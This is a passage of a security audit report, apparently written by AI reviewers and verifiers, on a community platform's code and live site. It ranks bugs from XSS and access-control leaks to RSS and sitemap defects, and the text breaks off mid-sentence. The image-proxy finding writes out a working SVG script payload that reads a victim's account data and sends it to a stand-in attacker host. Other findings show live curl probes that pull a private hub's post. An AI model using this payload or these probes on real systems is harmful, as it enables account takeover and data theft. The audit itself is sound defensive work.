Verified line by line. `seed()` (ContestRegistrationForm.vue:46-52) deletes every key in the reactive `values` map before re-seeding from `props.savedFields`, and the watcher at :53 uses `deep: true` over `[props.savedFields, props.template]`, so it force-fires on any identity change of `savedFields` — `values` is not tracked by the getter, so typing does not retrigger it, but a late-arriving prop does. On `/contests/:slug/register`, `savedFields` is `computed(() => reg.value?.fields ?? null)` over a `useLazyFetch(..., { server: false })` (register.vue:26-32), and `register.get.ts` returns `fields: reg?.fields ?? null`, so an already-registered viewer's null -> object transition is real. The form is rendered under `v-else="open"`, which depends only on the SSR'd `contest`, so it is mounted and fully interactive for the whole fetch. The path is in fact wider than claimed: `ContestSignup.vue:169-171` `onEditDetails()` calls `navigateTo('/contests/<slug>/register')` for any rich template (contestRegistration.ts:17-23), so this is a CLIENT-SIDE navigation with no hydration involved — the page paints instantly with an empty form and the window is the full API round trip, not a sub-hydration sliver. No guard exists anywhere: no upstream validator, no gating `v-if` on `reg`, no dirty-check inside `seed`. The `contests` feature flag is live (deveco contest shipped session 249). The two component test files pass `savedFields` statically at mount (ContestRegistrationForm.test.ts:70, :134-136) and only pin prefill and dirty state; nothing pins non-clobbering on a late prop. The claim's exemption for first-time registrants is also correct: `fields` stays null, the computed's value does not change, so Vue never notifies the prop and the watcher does not fire. Severity P3 stands — recoverable, no security impact, confined to already-registered editors of rich-form contests.

</details>

### Unauthenticated public surfaces

#### [P1] /api/image-proxy serves attacker-controlled SVG same-origin with no CSP — unauthenticated XSS

`layers/base/server/api/image-proxy.get.ts:45`

The proxy accepts any HTTPS URL from an anonymous caller, and its only content gate is `if (!contentType.startsWith('image/'))` where `contentType` is the verbatim upstream `content-type` header (packages/protocol/src/ssrf.ts:358). `image/svg+xml` passes. The bytes are then returned with `Content-Type: <upstream>` (line 50) and NOTHING else: no `Content-Disposition: attachment`, no neutralizing CSP (nosniff does not help, since SVG is a genuine scriptable document type). The codebase already knows this is required — layers/base/server/utils/serveFile.ts:37 sets `default-src 'none'; style-src 'unsafe-inline'; sandbox` for exactly this MIME — but image-proxy does not use setStoredFileHeaders. Worse, the global CSP that would have blocked inline script is explicitly skipped for this path: layers/base/server/middleware/security.ts:90 reads `if (!pathname.startsWith('/api/'))` with the comment "JSON doesn't need CSP". /api/image-proxy does not return JSON. The response is advertised as `public, max-age=86400, s-maxage=604800` (line 51), so any shared cache holds the payload for a week.

**Failure:** Attacker hosts https://evil.example/x.svg returning `Content-Type: image/svg+xml` with `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('/api/users/me')...</script></svg>`. They send any deveco.io user (or an admin) the link https://deveco.io/api/image-proxy?url=https%3A%2F%2Fevil.example%2Fx.svg . The victim's browser navigates to it, gets a document served from origin deveco.io with content-type image/svg+xml and no Content-Security-Policy header, and executes the script in deveco.io's origin. Session cookies are httpOnly, but same-origin script acts as the victim through every authenticated API — read a private contest's PII endpoints, change the account email, add an admin. No authentication is needed to serve the payload and no feature flag gates the route (there is no requireFeature call).

**Reachable input:** Unauthenticated, no flag, no cookie. Two steps: 1. Attacker serves at https://evil.example/x.svg, with response header `Content-Type: image/svg+xml`, the body: `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('/api/users/me',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('https://evil.example/x?'+encodeURIComponent(t)))</script></svg>` 2. Victim (any logged-in deveco.io user) top-level-navigates to: `GET https://deveco.io/api/image-proxy?url=https%3A%2F%2Fevil.example%2Fx.svg&w=600` The response is served from origin deveco.io with content-type image/svg+xml and no CSP/Content-Disposition, so the SVG loads as a document and the script runs in deveco.io's origin. Reachability of step 2 verified for real (substituting a benign public SVG host, since I cannot host evil.example): `curl -D - "https://deveco.io/api/image-proxy?url=https%3A%2F%2Fupload.wikimedia.org%2Fwikipedia%2Fcommons%2F0%2F02%2FSVG_logo.svg&w=600"` → `HTTP/2 200`, `content-type: image/svg+xml`, `content-length: 4019`, `x-image-proxy: commonpub`, no content-security-policy header, no content-disposition header. Anonymous request, arbitrary remote host accepted.

**Suggested fix:** Reject `image/svg+xml` outright (allowlist png/jpeg/webp/gif/avif instead of the `image/` prefix), and route the response through setStoredFileHeaders so nosniff + the sandbox CSP + attachment disposition apply. Separately, stop skipping CSP for /api/ — send at minimum `default-src 'none'; sandbox` on non-JSON API responses.

<details><summary>Verifier (high confidence)</summary>

Survives verification, but P0 is too high. VERIFIED IN CODE: - layers/base/server/api/image-proxy.get.ts (whole file, 69 lines): no auth check, no requireFeature, no host allowlist. Only gates are `parsed.protocol !== 'https:'` and `!contentType.startsWith('image/')`. `image/svg+xml` passes both. - packages/protocol/src/ssrf.ts safeFetchBinary: `const contentType = response.headers.get('content-type') ?? ''` — verbatim attacker-controlled upstream header; body returned as a raw Buffer, never sanitized (no sanitizeHtml/sharp on this path; the `accept: 'image/*'` request header is advisory only). - The handler sets `'Content-Type': contentType` and returns the Buffer. h3 1.15.10 `handleHandlerResponse` takes the `val.buffer` branch → `send(event, val)` with no type → `defaultContentType` only sets a type when none exists, so the upstream MIME survives to the wire. No Content-Disposition, no CSP. - layers/base/server/middleware/security.ts:88-90 — CSP is set only under `if (!pathname.startsWith('/api/'))`. getSecurityHeaders (packages/infra/src/security.ts:116) adds only nosniff / XFO / Referrer-Policy / Permissions-Policy; nosniff is inert here because image/svg+xml is a genuinely scriptable document type. - layers/base/nuxt.config.ts:186 `routeRules: {}` — no per-route header injection. No auth/feature middleware touches this path (features.ts explicitly returns early for `/api`). - The project's own neutralizer exists and is NOT used here: layers/base/server/utils/serveFile.ts:6,27,37 sets `default-src 'none'; style-src 'unsafe-inline'; sandbox` + attachment disposition for exactly this MIME, and apps/reference/server/routes/uploads/[...path].get.ts:72 does the same. So this is an inconsistency, not intended behaviour. Git history (4fd07efb "SSRF + body-cap + sharp DoS hardening") shows the route was hardened for SSRF/OOM only; MIME neutralization was never applied. EMPIRICALLY CONFIRMED LIVE (unauthenticated curl against deveco.io, output above): HTTP/2 200, `content-type: image/svg+xml`, `cache-control: public, max-age=86400, s-maxage=604800`, `x-image-proxy: commonpub`, and no `content-security-policy` and no `content-disposition` in the response. Arbitrary third-party host, no allowlist. WHY NOT P0: exploitation is not automatic. Every call site of proxiedImageUrl (FederatedContentCard.vue:23, ContentCard.vue:29, pages/contests/index.vue:23) renders the URL as an `<img src>`, where SVG scripts do not execute; and `X-Frame-Options: DENY` blocks the iframe/object document path. The only working vector is getting a victim to top-level-navigate to a crafted link, i.e. it needs user interaction and a phishing step. That is a serious same-origin XSS primitive (full authenticated-API access as the victim, localStorage read, week-long shared-cache persistence of the payload), but it is not a no-interaction mass compromise or a live outage. P1. Fix is one line of reuse: call setStoredFileHeaders (or set the SVG_NEUTRALIZE_CSP + attachment disposition) instead of the bare setResponseHeaders, or reject any contentType that is not a raster image.

</details>

#### [P2] Hub post AP Note lookup is not scoped to the hub in the URL — private hub post leaks anonymously

`layers/base/server/middleware/hub-post-ap.ts:56`

The middleware resolves the hub from the URL slug and correctly refuses when `hub.privacy === 'private'` (line 43, with a comment stating this exists precisely so a private hub post Note cannot leak). But the post query on lines 45-57 is `.where(eq(hubPosts.id, postId))` — it never constrains `hubPosts.hubId` to the hub it just authorized. The privacy decision is made about one object and the data is read from another. `hub_posts.hub_id` exists and is indexed (packages/schema/src/hub.ts:83, idx_hub_posts_hub_id), so the join key is available and simply unused.

**Failure:** Alice is removed from (or leaves) the private hub `internal-ops` but still has post ids from screenshots, notification links, or browser history. `public-lounge` is any public hub on the same instance. She (or anyone she gives the URL to, unauthenticated) requests `GET /hubs/public-lounge/posts/<uuid-of-a-private-internal-ops-post>` with `Accept: application/activity+json`. The gate passes because public-lounge is not private; the SELECT then returns the internal-ops post regardless. The response is the post's full text, the author's username and the created timestamp, addressed `to: [AP_PUBLIC]` (line 100) so any fediverse crawler treats it as world-public.

**Reachable input:** Verified live, unauthenticated, no headers beyond Accept: `curl -H 'Accept: application/activity+json' https://deveco.io/hubs/simms-intelligent-solutions/posts/5b755dd1-a204-42a5-872c-0ebfdf943978` → HTTP 200, body `{"type":"Note","id":"https://deveco.io/hubs/simms-intelligent-solutions/posts/5b755dd1-...","attributedTo":"https://deveco.io/users/keenan","content":"Hello from Bread Board Foundry!","to":["...#Public"],"context":"https://deveco.io/hubs/simms-intelligent-solutions"}` — that post's hubId is 79e8b9fc-d5a8-414d-bf0b-3a80b3dbbdf9 (bread-board-foundry), not the simms hub in the URL. Privacy instantiation of the same request: with any hub H where H.privacy='private' and any hub P where P.privacy!='private' on the same instance, `GET /hubs/{P.slug}/posts/{uuid of a row in hub_posts with hub_id = H.id}` with `Accept: application/activity+json` and no session returns that private post's full text, author username and created timestamp. The identical request at `/hubs/{H.slug}/posts/{same uuid}` correctly returns nothing (line 43). Precondition: the requester knows the post UUID — obtainable by a removed/departed member of H from browser history, a notification link, a screenshot or a GDPR export, and shareable onward to any anonymous party; it is not guessable or enumerable by an outsider.

**Suggested fix:** Change the where to `and(eq(hubPosts.id, postId), eq(hubPosts.hubId, hub.id))` so the row read is the row authorized. The REDACTED_HUB_ID defense-in-depth described in packages/server/src/hub/access.ts:5-9 also only works when the query is keyed on hubId.

<details><summary>Verifier (high confidence)</summary>

Confirmed by reading the code AND by live probe. hub-post-ap.ts:42-43 resolves the hub from the URL slug and refuses when hub.privacy === 'private' (a control added deliberately in commit 3b60a903 "fix(security): gate private-hub post AP middleware"), but the SELECT at :45-57 filters only on eq(hubPosts.id, postId) — hubPosts.hubId is never constrained to the authorized hub, even though the column is NOT NULL and indexed (idx_hub_posts_hub_id). The authorization decision is made about one row and the data is read from another. No upstream guard exists: the regex at :27 only validates slug shape and UUID shape; the flag gate at :31 is satisfied on both live instances (curl /api/features on commonpub.io and deveco.io both return federation:true, federateHubs:true); there is no test for this middleware (layers/base/server/middleware/__tests__/ contains only content-ap, csrf, require-terms, security-analytics-csp). Every other private-hub surface IS gated — outbox.ts:24-27, api/hubs/[slug]/posts/index.get.ts and feed.xml.get.ts both call requireHubReadAccess, and hubFederation.ts returns early on hub.privacy === 'private' at lines 92, 267, 312, 421, 625, 804 — which both proves the control is intentional and means this middleware is the only hole in it. I verified the unscoped read live: GET https://deveco.io/hubs/simms-intelligent-solutions/posts/5b755dd1-a204-42a5-872c-0ebfdf943978 (a post that belongs to hub bread-board-foundry) returned 200 application/activity+json with the full post content, author URI and timestamp, with id/context/cc forged to the simms hub. Severity is overstated at P1: hub_posts.id is a random v4 UUID (defaultRandom) and every non-member listing surface is access-gated, so there is no enumeration path — the bypass requires prior possession of the id by someone who was once authorized. That is a real access-control bypass plus a federation data-integrity bug (remote consumers cache the Note attributed to the wrong hub), but not anonymous mass disclosure. P2.

</details>

#### [P2] RSS feeds emit raw C0 control characters, making the whole feed a fatal XML parse error

`layers/base/server/routes/feed.xml.ts:35`

`escapeXml` (lines 3-10) handles only `& < > " '`. XML 1.0 §2.2 forbids every C0 control character except tab/LF/CR anywhere in a document, and forbids referencing them numerically too, so escaping cannot repair them — they must be stripped before interpolation. `item.title` and `item.description` go into the feed verbatim, and nothing upstream removes control characters: the validator is `title: z.string().min(1).max(255)` (packages/schema/src/validators/content.ts:24) with no charset constraint, and createContent stores it unchanged (`title: input.title`, packages/server/src/content/content.ts:747). Only block content is sanitized (content.ts:22-67); title/description are not. The same unguarded escapeXml is copy-pasted into three more feeds: layers/base/server/api/users/[username]/feed.xml.get.ts:3, api/hubs/[slug]/feed.xml.get.ts:3, api/federated-hubs/[id]/feed.xml.get.ts:3.

**Failure:** A member publishes a public blog post whose title was pasted from a Word doc or PDF and contains U+000B (Word's soft line break) or U+0001. The row saves fine and the post renders fine. From then on `GET /feed.xml` returns a byte stream containing that raw control char inside `<title>`; every conforming XML parser (Feedly, NetNewsWire, Thunderbird, Google's feed fetcher, `xmllint`) aborts with a fatal 'PCDATA invalid Char value 11' at that byte and discards the entire document — not just that item. Every subscriber's feed goes dead until the title is edited, with no error surfaced anywhere in the app. On api/federated-hubs/[id]/feed.xml.get.ts the input is remote AP `content` (lines 39/43) that a hostile remote instance controls directly, so it needs no local cooperation at all.

**Reachable input:** As any authenticated member (no admin, no special role): 1) POST /api/content with body {"type":"blog","title":"Hello World","visibility":"public"} — is a legal JSON escape that JSON.parse turns into a raw U+000B; zod's z.string().min(1).max(255) accepts it and Postgres stores it in the varchar(255) title column (verified: chr(11) round-trips, only chr(0) is rejected). 2) POST /api/content/{id}/publish (layers/base/server/api/content/[id]/publish.post.ts requires only requireAuth + ownership) to set status=published. 3) GET /feed.xml unauthenticated — listContent returns the row (status published, visibility public), escapeXml passes the U+000B through untouched, and the emitted body fails conforming XML parsing with the fatal error `PCDATA invalid Char value 11`, which I reproduced with xmllint (exit code 4), discarding the entire document including all other items. The same input via POST /api/content/import.post.ts is the accidental bulk-import vector. Not reachable: the api/federated-hubs/[id]/feed.xml.get.ts variant, which is gated behind requireFeature('federation') + requireFeature('federateHubs').

**Suggested fix:** In the shared escape helper, strip disallowed characters before entity-escaping (drop U+0000-08, U+000B, U+000C, U+000E-1F, lone surrogates, U+FFFE/FFFF), then escape. Hoist the one helper into a shared module so all four feeds get the fix; the current four copies guarantee drift.

<details><summary>Verifier (high confidence)</summary>

Confirmed, and reproduced end to end. (1) escapeXml at layers/base/server/routes/feed.xml.ts:3-10 replaces exactly & < > " ' and nothing else; item.title (:35) and item.description (:39) are interpolated through it. (2) I hunted for every guard and found none. Repo-wide grep for control-char stripping returns exactly one app-code hit, packages/server/src/publicApi/cors.ts:44 (CONTROL_CHARS for CORS *headers*), which never touches content. parseBody (layers/base/server/utils/validate.ts:42) enforces only a 10MB cap plus the Zod schema; createContentSchema has title: z.string().min(1).max(255) with no charset constraint; createContent stores `title: input.title` verbatim (packages/server/src/content/content.ts:747) and `description` is a pure passthrough via CONTENT_PASSTHROUGH_FIELDS (content.ts:700-713) — only `content` is sanitized. The route has no requireFeature, no auth, and no route rule; middleware/features.ts skips it. No test anywhere references feed.xml. (3) Against the live dev Postgres I confirmed the DB is not the guard: 'Hello'||chr(11)||'World' round-trips a text column intact (ascii=11), while chr(0) errors 'null character not permitted' — so U+0000 is the ONLY C0 char rejected; the other 30 persist. title is varchar(255), description is text. (4) I reproduced the failure with a verbatim copy of escapeXml: JSON "Hello World" parses to a raw VT, passes min(1)/max(255), survives escapeXml unchanged, and xmllint --noout aborts with exactly `parser error : PCDATA invalid Char value 11` (exit 4), discarding a trailing well-formed <item> as well. Two corrections to the finding: (a) the federated-hubs claim that a hostile remote needs 'no local cooperation at all' is materially overstated — that handler opens with requireFeature('federation') and requireFeature('federateHubs'), and per CLAUDE.md hub federation is flag-gated and local-only in v1, so it is not the reachable path; (b) the Word-paste narrative is the weak vector since browsers normalize most control chars pasted into inputs — the JSON API (and api/content/import.post.ts bulk import) is what makes this trivially reachable. Severity drops to P2: it requires an authenticated account, is not a privacy or privilege defect, and is repairable by editing the title, but it is real cross-member availability damage on an ungated public surface — one member silently kills instance-wide /feed.xml for every subscriber with no error surfaced.

</details>

#### [P2] sitemap.xml publishes profile URLs for users whose profileVisibility is members or private

`layers/base/server/routes/sitemap.xml.ts:40`

The profile query filters on `eq(users.status, 'active')` only. `users.profile_visibility` (packages/schema/src/auth.ts:29, enum public|members|private) is never consulted, so a user who set their profile to private is still emitted as a `<url>` with priority 0.6 and changefreq weekly. This is a different producer from the round-1 `/api/users` finding — it is the surface that actively hands those URLs to Google and Bing rather than merely answering when asked, and it stays broken even after the API-side visibility filter is added, because the fix lives in this file's WHERE clause. The content query on the same page does gate visibility (line 31), and the hub list inherits its privacy gate from listHubs (packages/server/src/hub/hub.ts:36) — profiles are the one source left ungated.

**Failure:** A contest entrant on deveco.io sets Profile visibility to 'private' in settings, reasonably expecting not to be indexed. `https://deveco.io/sitemap.xml` still lists `https://deveco.io/u/<their-username>` and robots.txt (robots.txt.ts:13) points every crawler at that sitemap, so the URL is submitted for indexing and the profile ends up in Google's cache — a durable third-party copy the operator cannot revoke, unlike the in-app leak.

**Reachable input:** Two steps on any live instance (e.g. deveco.io), no flags required. (1) As any authenticated member: `PUT /api/profile` with body `{"profileVisibility":"private"}` (the exact request /settings/privacy issues at privacy.vue:528 when the member picks 'Private' and clicks 'Save visibility'). This sets users.profile_visibility='private' while users.status remains 'active'. (2) Unauthenticated, no cookies: `GET https://deveco.io/sitemap.xml` — the 200 XML response contains `<url><loc>https://deveco.io/u/&lt;that-username&gt;</loc><lastmod>…</lastmod><changefreq>weekly</changefreq><priority>0.6</priority></url>`, because the query at sitemap.xml.ts:34-40 filters on status only. GET /robots.txt (robots.txt.ts:13) publishes `Sitemap: https://deveco.io/sitemap.xml` to every crawler.

**Suggested fix:** Add `eq(users.profileVisibility, 'public')` and `isNull(users.deletedAt)` to the where clause, and emit `<meta name="robots" content="noindex">` on non-public profile pages so already-indexed URLs drop out.

<details><summary>Verifier (high confidence)</summary>

Confirmed by reading the code. layers/base/server/routes/sitemap.xml.ts:34-40 queries `users` directly with only `eq(users.status,'active')` and :65-72 emits `${siteUrl}/u/${username}` for every row; there is no profileVisibility (or deletedAt) predicate. The setting is genuinely reachable and not behind a feature flag: packages/schema/src/validators/auth.ts:82 accepts `profileVisibility: z.enum(['public','members','private'])`, layers/base/server/api/profile.put.ts applies it via requireAuth + updateProfileSchema, packages/server/src/profile/profile.ts:182 persists it, and the control ships unconditionally on /settings/privacy (privacy.vue:907-941; the file's own comment at line 901 states profile visibility is NOT inside the sharing gate). The shipped hint copy (privacy.vue:499-503) promises `private: 'Only you can see your profile.'` No guard exists: robots.txt.ts:13 advertises the sitemap to all crawlers, the only sitemap test (apps/reference/e2e/seo.spec.ts:21-29) asserts status 200 and content-type only, there is no override route in apps/reference/server/routes (only `uploads`) and no sitemap Nuxt module. Git history is against intent: commit df0486f3 'Phase P-1b — close remaining content/hub privacy leaks' added the visibility gate to the content query on line 31 and left the user query ungated, so this is an oversight inside a privacy-fix commit. The claim's distinctness also holds: sitemap.xml.ts builds its own Drizzle query against the users table rather than calling @commonpub/server, so fixing getUserByUsername (which is itself ungated, profile.ts:35-40 — the round-1 in-app leak) would not fix this file; the sitemap would still hand crawlers usernames and lastmod timestamps for private members. Not P1: no privilege escalation, no secrets or private content exposed, and the state is user-selected rather than attacker-induced. P2 stands.

</details>

#### [P3] sitemap.xml is an unbounded full-table read; past 50,000 URLs Google rejects the whole document

`layers/base/server/routes/sitemap.xml.ts:20`

Neither of the two big queries has a LIMIT: `publishedContent` selects every published+public row of `content_items` joined to `users` (lines 20-31), and `publicUsers` selects every active row of `users` (lines 34-40). Every URL is then accumulated into one in-memory array and concatenated into a single string (lines 96-104). The hub and path queries are capped at 100 each, so the caps were clearly intended and simply omitted for the two unbounded sources. There is no sitemap-index sharding anywhere in the tree.

**Failure:** As soon as an instance passes 50,000 combined content + profile URLs, `/sitemap.xml` exceeds the sitemap protocol's hard limits (50,000 URLs / 50MB uncompressed). Google and Bing do not truncate — they reject the document, so the instance loses sitemap coverage entirely and silently, at exactly the point where it needs it. Before that, every cache miss on an anonymous, unauthenticated GET does two unbounded sequential scans plus a full string build; a crawler hitting it (and it is advertised to every crawler by robots.txt.ts:13) after each 3600s expiry pins a worker and allocates the whole document. The rate-limit tier for this path is `general` = 120 req/min per IP (packages/infra/src/security.ts:253, 277), so 120 full-table scans per minute per IP are permitted.

**Reachable input:** `GET /sitemap.xml` with no cookie and no Authorization header, against an instance whose DB holds more than 50,000 rows across (content_items WHERE status='published' AND visibility='public' INNER JOIN users) plus (users WHERE status='active'). No auth, CSRF, feature flag, or middleware stands between the request and the two unbounded selects — verified: middleware/auth.ts only sets event.context.auth, middleware/security.ts skips only static assets and admits the path at the `general` 120/min/IP tier, routeRules is `{}`, and robots.txt.ts:13 advertises the URL to every crawler. Two caveats on how that DB state arises: it is reached by ordinary growth over years, not by any single request an attacker controls, and the active-user half is only partly attacker-influenced (open signup is capped at the `auth` tier of 5/min/IP, so seeding 50k accounts from one IP is roughly a week of sustained requests). At today's row counts on commonpub.io / deveco.io / heatsync the same request completes normally.

**Suggested fix:** Shard: serve a sitemap index at /sitemap.xml pointing at /sitemap-content-N.xml and /sitemap-users-N.xml, each bounded to <= 45,000 rows via keyset pagination, and stream the response rather than building one string.

<details><summary>Verifier (high confidence)</summary>

The code facts check out and nothing guards them. I read layers/base/server/routes/sitemap.xml.ts end to end: the content select (:20-31) and the users select (:34-40) have no .limit(), while listHubs/listPaths on :43/:46 are both capped at 100 — the asymmetry is real, and feed.xml.ts:23 uses limit: 50, so bounding XML endpoints is the house pattern. There is no sitemap-index sharding anywhere (grep -rn sitemap finds exactly one route). No guard exists: routeRules is literally `{}` at layers/base/nuxt.config.ts:186 and the handler is a plain defineEventHandler, not cachedEventHandler, so the Cache-Control at :107 is a client hint only and EVERY request runs both scans (the finding actually understates this by saying "every cache miss"). No auth gate — middleware/auth.ts only populates context, and middleware/security.ts:53 skips only static assets, so /sitemap.xml lands in the `general` tier, 120/min/IP, and only in production. The one test naming this file, contentReadGuard.test.ts:47, is a visibility allowlist that pins privacy, not boundedness. Git history shows three commits, none making unboundedness deliberate. Where the finding overreaches is impact. The headline outcome is entirely latent: it needs >50k combined public content rows plus active users, and nothing suggests any live instance (small self-hosted maker communities) is within an order of magnitude of that. The per-request scan is cheap at current table sizes, so the rate-limit angle is not an outage today. The correct fix is also not the implied one-line `.limit()` — a bare cap silently truncates, which is strictly worse than the current behaviour; it needs a sitemap index with sharding. Real, unguarded, but latent and SEO-degradation-only: P3, not P2. Secondary detail worth passing along: the users query comment says "Users with public profiles" but the predicate is only status='active', so it emits a profile URL for every active account regardless of any profile-visibility preference.

</details>

#### [P3] Private-hub RSS is per-viewer authorized but sent as `Cache-Control: public` with no Vary

`layers/base/server/api/hubs/[slug]/feed.xml.get.ts:61`

This route reads the optional session (line 16), resolves membership through `getHubBySlug(db, slug, user?.id, { asPlatformAdmin: ... })` and then calls `requireHubReadAccess` (line 25), which 403s an anonymous caller on a `private` hub and 200s an active member (packages/server/src/hub/access.ts:22-28). So the response body is a function of who asked. It is nevertheless emitted with `Cache-Control: public, max-age=600, stale-while-revalidate=300` and no `Vary: Cookie`. `public` is the explicit instruction that shared caches may store and reuse it for any requester. This is the only viewer-varying response in the layer marked publicly cacheable — every other per-viewer route sets `no-store` (contests/[slug]/registrants.get.ts:49, registrants-export.get.ts:36, export.get.ts:40, files/[id]/raw.get.ts:81 with the comment 'Per-user authorized content — never cached by shared caches').

**Failure:** A member of the private hub `internal-ops` opens https://deveco.io/api/hubs/internal-ops/feed.xml in a reader. Any shared cache on the path — a CDN with cache-everything, a corporate forward proxy, a self-hoster's Varnish or nginx proxy_cache — stores the 200 keyed on the URL alone. For the next 600 seconds (plus 300s stale-while-revalidate) an anonymous request for the same URL is answered from cache with the private hub's gallery: titles, descriptions, author display names and canonical links, instead of the 403 the origin would have produced. The current Caddy deployments do not cache, so this is latent there; it is immediately live for any self-hoster who fronts the app with a cache, since the header is an instruction to cache and nothing else marks the response private.

**Reachable input:** 1) As any authenticated user: POST /api/hubs {"name":"Internal Ops","slug":"internal-ops","hubType":"community","privacy":"private","description":"Q4 roadmap hub"} -> creator becomes active owner. 2) Share a published, public content item into it: POST /api/hubs/internal-ops/share {"contentId":"<uuid>"}. 3) As that member, with the better-auth.session_token cookie: GET /api/hubs/internal-ops/feed.xml -> 200 application/rss+xml carrying the hub description and the shared items, with response header `Cache-Control: public, max-age=600, stale-while-revalidate=300` and no Vary. 4) Anonymous GET of the same URL at the origin -> 403 "This hub is private". A shared cache between the member and the origin (CDN cache-everything, forward proxy, nginx proxy_cache/Varnish) is permitted by the `public` directive to store the step-3 response keyed on URL alone and serve it for step 4 for up to 900s. Deployment-conditional: the three live Caddy instances do not cache, so this is latent there and immediately live for a self-hoster with a caching front end.

**Suggested fix:** Branch the header on the hub: `public, max-age=600` only when `hub.privacy === 'public'` and no session was used; otherwise `private, no-store`. Add `Vary: Cookie` unconditionally on this route.

<details><summary>Verifier (high confidence)</summary>

Confirmed by reading the code. The route is genuinely authorization-dependent: line 16 getOptionalUser reads the session from the better-auth cookie, line 19-21 resolves membership, line 25 requireHubReadAccess -> canReadHub (packages/server/src/hub/access.ts:22-28) 403s a non-member on a `private` hub and 200s an active member. The 200 is then emitted at line 61 with `Cache-Control: public, max-age=600, stale-while-revalidate=300` and no Vary. I grepped `Vary` across layers/ and packages/: the only occurrences are `Vary: Origin` in middleware/public-api-auth.ts. routeRules is `{}` (layers/base/nuxt.config.ts:186) and middleware/security.ts sets no cache headers, so nothing downstream corrects it. Not deliberate: `git log -S "public, max-age=600"` shows the header came from the initial layer commit 00790b98, and the auth gate was added later by b6e8049e ("fix(security): enforce content visibility + hub privacy on all read paths") whose diff on this file adds getOptionalUser + requireHubReadAccess and leaves the `public` header untouched. No test pins the header. The precondition is not privileged: hubs/index.post.ts is requireAuth-only with no feature flag, createHubSchema accepts privacy:'private' (packages/schema/src/validators/hub.ts:15), and createHub inserts the creator as an active `owner` member. Two corrections to the claim: (1) the payload is smaller than stated. listHubGallery (packages/server/src/product/product.ts:614+) filters every branch through visibleContentWhere() with no requesterId, i.e. published + visibility='public' + not deleted, so the item titles/links/authors are individually public content already reachable at /u/{username}/{type}/{slug}. The genuine members-only delta is the channel <description> (hub.description, which getHubBySlug explicitly nulls for private-hub non-members, hub.ts:308-330) plus the association fact that those public items sit in private hub X, plus a 200 where the origin would 403. (2) the 403 throws before line 61, so only the member 200 carries the header; the leak direction is member->anonymous only, and 403s are not cached. Severity drops to P3: the cross-viewer disclosure needs a shared cache in the request path, and all three live instances run Caddy without caching, so nothing is exploitable today. It remains a real CWE-525-class defect for a self-hoster fronting the app with a CDN or Varnish, and it is the only viewer-varying response in the layer marked publicly cacheable (every sibling gated route sets no-store or no Cache-Control at all).

</details>

#### [P3] Hub AP products/resources collections truncate at 20 and report page length as totalItems

`layers/base/server/routes/hubs/[slug]/products.ts:26`

`listHubProducts(db, hub.id)` is called with no pagination options, so `normalizePagination({})` applies its default of 20 (packages/server/src/query.ts:157). The route then serves `totalItems: items.length` (line 35) — the size of the first page, not the collection — and the OrderedCollection exposes no `first`/`next` page links, so there is no way for a consumer to reach items 21+. Identical defect in the sibling resources collection (layers/base/server/routes/hubs/[slug]/resources.ts:26,35), which relies on the same default.

**Failure:** HeatSync Labs' hub has 35 products. A remote CommonPub instance dereferences `https://heatsynclabs.io/hubs/heatsync/products` with `Accept: application/activity+json` and receives `totalItems: 20` with 20 orderedItems and no continuation link. The remote instance now believes it has mirrored the complete catalogue; products 21-35 never federate and never will, and no error is raised at either end. The wrong `totalItems` also makes the truncation undetectable by a consumer comparing counts.

**Reachable input:** Two steps, both available today on deveco.io or commonpub.io (both have federateHubs=true, verified via GET /api/features): 1. As any user with an ACTIVE membership in hub `netburner` (createProduct requires only `hubMembers.status='active'`, any role, and enforces no product-count cap), issue 21 requests: POST https://deveco.io/api/hubs/netburner/products Cookie: <session> {"name":"Widget 21","category":"hardware","status":"active"} 2. Then, with NO authentication at all: GET https://deveco.io/hubs/netburner/products Accept: application/activity+json The response is `{"type":"OrderedCollection","totalItems":20,"orderedItems":[ ...20 items... ]}` with no `first` or `next` property. Products 21+ are absent and unreachable. I confirmed step 2 already returns 200 with a live OrderedCollection body against https://deveco.io/hubs/seeed-studio/products (currently `totalItems: 0` only because that hub has no products yet) - the route, the flag gate, and the unauthenticated path are all live right now; only the >20-row DB state is missing, and step 1 creates it with no guard in the way. Automatic follow-on with no further input: a remote CommonPub instance mirroring that hub runs syncFederatedHubCollection (hubMirroring.ts:229), stores the 20 it received, and deletes any previously mirrored product not in that page.

**Suggested fix:** Use the `total` that listHubProducts/listHubResources already return for `totalItems`, and either raise the limit to the 100 maxLimit with a `first`/`next` OrderedCollectionPage chain, or page the collection properly as the hub outbox already does.

<details><summary>Verifier (high confidence)</summary>

CONFIRMED for products; the resources half of the finding is factually wrong and should be struck. PRODUCTS (real): layers/base/server/routes/hubs/[slug]/products.ts:26 calls `listHubProducts(db, hub.id)` with no filters. packages/server/src/product/product.ts:263 defaults `filters = {}`, line 278 runs `normalizePagination(filters)`, and packages/server/src/query.ts:157 falls back to `defaults.limit ?? 20` -> LIMIT 20. Route line 35 then emits `totalItems: items.length` (= 20) with no `first`/`next` link, so items 21+ are unreachable and the truncation is undetectable by count comparison. NOT guarded: (a) the `federateHubs` flag defaults to false in packages/config/src/schema.ts:89 but is empirically ON in production - `GET /api/features` returns `federateHubs: true` on commonpub.io and deveco.io. I hit the endpoint unauthenticated and it served the collection: `curl -H "Accept: application/activity+json" https://deveco.io/hubs/seeed-studio/products` -> `{"type":"OrderedCollection","totalItems":0,"orderedItems":[]}` (200, no auth, no 404). (b) No per-hub product cap: createProduct only checks active hub membership. (c) No test pins the behaviour; product.integration.test.ts:77 and hub-privacy-p2.integration.test.ts:225 only assert length 0 / >0. Intent is clearly a full unpaginated collection, not a deliberate page: the sibling followers.ts:53 builds the complete URI list and sets `totalItems: allUris.length`, and resources.ts does the same. Products is the outlier purely because its list helper carries a hidden default. Git history (bb4af638 "add cpub:resources + cpub:products collections to Group actor") shows no pagination was ever intended here. Consumer amplifies it: packages/server/src/federation/hubMirroring.ts:229 calls syncFederatedHubCollection(...,'products'), which reads only `orderedItems`, never looks for `first`/`next`, and then runs a prune loop deleting any mirrored product whose objectUri was absent from the received page. A remote mirror can therefore never hold more than 20 products, and the rest are silently dropped with no error at either end. RESOURCES (refuted): packages/server/src/hub/resources.ts:23-45 - `listHubResources(db, hubId)` takes NO filters parameter, never calls normalizePagination, and returns every row (`return { items: rows, total: rows.length }`). The sibling resources collection is correct; the finding's claim that it "relies on the same default" is false and that half must be removed. Severity stays P3: no security or privacy impact, no auth bypass, and no live instance currently has a hub near the threshold (largest product count found on 